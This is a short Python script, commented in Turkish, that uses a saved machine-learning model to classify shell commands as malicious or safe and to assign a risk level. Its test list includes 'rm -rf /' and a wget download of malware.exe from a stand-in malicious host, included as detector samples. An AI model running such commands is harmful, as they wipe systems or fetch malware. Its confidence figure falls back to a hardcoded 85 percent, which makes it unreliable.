
import joblib
import numpy as np

def predict_command(command):
    """Komut tahmin fonksiyonu"""
    try:
      
        model = joblib.load('model.pkl')
        vectorizer = joblib.load('vectorizer.pkl')
        
       
        command_vector = vectorizer.transform([command])
        
        
        prediction = model.predict(command_vector)[0]
        
       
        if hasattr(model, 'predict_proba'):
            probabilities = model.predict_proba(command_vector)[0]
            confidence = max(probabilities) * 100
        elif hasattr(model, 'decision_function'):
            decision_score = model.decision_function(command_vector)[0]
            confidence = min(abs(decision_score) * 10, 100)  
        else:
            confidence = 85.0  
        
        
        if prediction == "malicious":
            if confidence > 90:
                risk_level = "YÜKSEK"
            elif confidence > 70:
                risk_level = "ORTA"
            else:
                risk_level = "DÜŞÜK"
        else:
            risk_level = "GÜVENLİ"
        
        result = {
            "command": command,
            "prediction": prediction,
            "confidence": round(confidence, 2),
            "risk_level": risk_level,
            "model_type": model.__class__.__name__
        }
        
        return result
        
    except Exception as e:
        return {
            "command": command,
            "prediction": "error",
            "confidence": 0,
            "risk_level": "UNKNOWN",
            "error": str(e)
        }

if __name__ == '__main__':
   
    test_commands = [
        "ls -la",
        "rm -rf /",
        "wget http://malicious.com/malware.exe",
        "mkdir test_folder"
    ]
    
    for cmd in test_commands:
        result = predict_command(cmd)
        print(f"Komut: {cmd}")
        print(f"Tahmin: {result['prediction']} (Güven: %{result['confidence']}, Risk: {result['risk_level']})")
        print("-" * 50)

